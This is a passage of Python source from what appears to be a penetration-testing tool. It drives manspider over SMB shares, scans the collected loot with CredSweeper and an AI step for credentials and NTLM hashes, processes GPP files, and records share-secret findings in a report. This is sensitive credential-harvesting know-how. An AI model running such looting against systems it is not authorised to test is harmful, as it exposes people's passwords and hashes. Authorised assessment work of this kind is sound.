                and os.path.isdir(loot_dir)
            ):
                analysis_context = analysis_context or {}
                candidate_files = _count_files_under_path(loot_dir)
                phase_name = str(phase or SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS)
                phase_label = str(
                    get_sensitive_phase_definition(phase_name).get("label", phase_name)
                )
                ai_history_path = _resolve_smb_loot_ai_history_path(
                    shell,
                    domain=domain,
                    username=str(auth_username or ""),
                    phase=phase_name,
                    backend="manspider",
                )
                credentials: dict[str, list[tuple[Any, Any, Any, Any, Any]]] = {}
                structured_stats = (
                    shell._get_spidering_service().process_local_structured_files(
                        root_path=loot_dir,
                        phase=phase_name,
                        domain=domain,
                        source_hosts=hosts or [],
                        source_shares=shares or [],
                        auth_username=auth_username or "",
                        apply_actions=True,
                    )
                )
                analysis_result = run_loot_credential_analysis(
                    shell,
                    domain=domain,
                    loot_dir=loot_dir,
                    phase=phase_name,
                    phase_label=phase_label,
                    candidate_files=candidate_files,
                    analysis_context=analysis_context,
                    ai_history_path=ai_history_path,
                    credsweeper_path=shell.credsweeper_path,
                    credsweeper_output_dir=os.path.join(loot_dir, ".credsweeper"),
                    jobs=credsweeper_jobs or get_default_credsweeper_jobs(),
                    credsweeper_findings=None,
                )
                credentials = dict(analysis_result.findings)
                if analysis_result.ai_attempted:
                    analysis_context["ai_attempted"] = True
                    analysis_context["ai_success"] = analysis_result.ai_success
                structured_files_with_findings = int(
                    structured_stats.get("files_with_findings", 0) or 0
                )
                ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
                if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    render_ntlm_hash_findings_flow(
                        shell,
                        domain=domain,
                        loot_dir=loot_dir,
                        loot_rel=loot_rel,
                        phase_label="Text credential scan",
                        ntlm_hash_findings=[
                            item
                            for item in ntlm_hash_findings
                            if isinstance(item, dict)
                        ],
                        source_scope="SMB file NTLM hash findings from Text credential scan",
                        fallback_source_hosts=hosts or [],
                        fallback_source_shares=shares or [],
                    )
                if credentials:
                    shell.handle_found_credentials(
                        credentials,
                        domain,
                        source_hosts=hosts,
                        source_shares=shares,
                        auth_username=auth_username,
                        source_artifact=loot_dir,
                    )
                    shell.update_report_field(domain, "smb_share_secrets", True)
                else:
                    current_report = (
                        shell.report.get(domain, {})
                        .get("vulnerabilities", {})
                        .get("smb_share_secrets")
                        if getattr(shell, "report", None)
                        else None
                    )
                    if current_report in (None, "NS", False):
                        shell.update_report_field(domain, "smb_share_secrets", False)
                total_findings, files_with_findings = (
                    _count_grouped_credential_findings(credentials)
                )
                total_files_with_findings = (
                    int(files_with_findings) + structured_files_with_findings
                )
                if not credentials and structured_files_with_findings == 0:
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    _print_analyzed_no_findings_preview(
                        loot_dir=loot_dir,
                        loot_rel=loot_rel,
                        candidate_files=_count_files_under_path(loot_dir),
                        phase_label=phase_label,
                        preview_limit=5,
                    )
                render_ranked_findings_panel(
                    findings=list(analysis_result.secret_findings),
                    loot_dir=loot_dir,
                    phase_label=phase_label,
                )
                render_files_of_concern_panel(
                    indicators=list(analysis_result.indicators),
                    loot_dir=loot_dir,
                    phase_label=phase_label,
                )
                return {
                    "completed": True,
                    "credential_findings": int(total_findings),
                    "files_with_findings": int(total_files_with_findings),
                    "artifact_hits": 0,
                    "ai_attempted": bool(analysis_context.get("ai_attempted")),
                    "ai_success": analysis_context.get("ai_success"),
                }
            return {
                "completed": True,
                "credential_findings": 0,
                "files_with_findings": 0,
                "artifact_hits": 0,
            }

        else:
            # For other types, maintain original behavior
            proc = shell.run_command(command)
            if proc is None:
                print_error(
                    "manspider scan failed before returning any output while searching for files in shares."
                )
                return {"completed": False, "artifact_hits": 0}

            if proc.returncode == 0:
                output_directory = loot_dir or "smb/spidering"
                files_found = []

                # Collect all found files
                if not os.path.isdir(output_directory):
                    print_warning_debug(
                        "Manspider output directory missing after successful run: "
                        f"{output_directory}"
                    )
                    return {"completed": True, "artifact_hits": 0}
                for filename in os.listdir(output_directory):
                    if filename.endswith(".json"):
                        continue
                    file_path = os.path.join(output_directory, filename)
                    if os.path.isfile(file_path):
                        files_found.append((filename, file_path))

                if not files_found:
                    print_error("No files found")
                    return {"completed": True, "artifact_hits": 0}

                print_warning("Files found:")
                for filename, file_path in files_found:
                    marked_file = mark_sensitive(filename, "path")
                    marked_path = mark_sensitive(
                        os.path.relpath(file_path, shell._get_workspace_cwd()),
                        "path",
                    )
                    shell.console.print(f"- {marked_file} ({marked_path})")

                artifact_records: list[ArtifactProcessingRecord] = []

                if scan_type == "gpp":
                    # For GPP files, process all automatically
                    for filename, file_path in files_found:
                        artifact_records.append(
                            shell.process_found_file(
                                file_path,
                                domain,
                                scan_type,
                                source_hosts=hosts,
                                source_shares=shares,
                                auth_username=auth_username,
                            )
                        )
                else:
                    # For other types, ask for each file
                    print_info_verbose("Starting analysis process...")
                    for filename, file_path in files_found:
                        respuesta = Confirm.ask(
                            f"Do you want to process the file {filename}?"
                        )
                        if respuesta:
                            print_info_verbose(f"Processing {filename}...")
                            artifact_records.append(
                                shell.process_found_file(
                                    file_path,
                                    domain,
                                    scan_type,
                                    source_hosts=hosts,
                                    source_shares=shares,
                                    auth_username=auth_username,
                                )
                            )
                        else:
                            print_info(f"Skipping {filename}")
                            artifact_records.append(
                                ArtifactProcessingRecord(
                                    path=file_path,
                                    filename=filename,
                                    artifact_type=Path(filename).suffix.lstrip(".")
                                    or "file",
                                    status="skipped",
                                    note="Skipped by user.",
                                )
                            )
                report_path = _persist_artifact_processing_report(
                    phase_root_abs=os.path.dirname(output_directory),
                    records=artifact_records,
                )
                _render_artifact_processing_summary(
                    shell,
                    phase_label=str(scan_type).upper(),
                    records=artifact_records,
                    report_path=report_path,
                )
                if artifact_records_extracted_nothing(artifact_records):
                    render_no_extracted_findings_preview(
                        loot_dir=output_directory,
                        loot_rel=os.path.relpath(
                            output_directory, shell._get_workspace_cwd()
                        ),
                        analyzed_count=len(files_found),
                        category="artifact",
                        phase_label=str(scan_type).upper(),
                        preview_limit=5,
                    )
                return {"completed": True, "artifact_hits": len(files_found)}
            else:
                print_error("Error executing manspider to search for files")
                print_error(f"Error: {proc.stderr.strip()}")
                return {"completed": False, "artifact_hits": 0}

    except Exception as e:
        telemetry.capture_exception(e)

        error_msg = str(e) if e else "Unknown error"
        error_type = type(e).__name__ if e else "Unknown"
        print_error(f"Error executing manspider: {error_msg}")
        print_error_debug(f"Manspider exception type: {error_type}")
        return {"completed": False, "artifact_hits": 0}
        print_error(f"Error type: {error_type}")
        print_exception(exception=e)
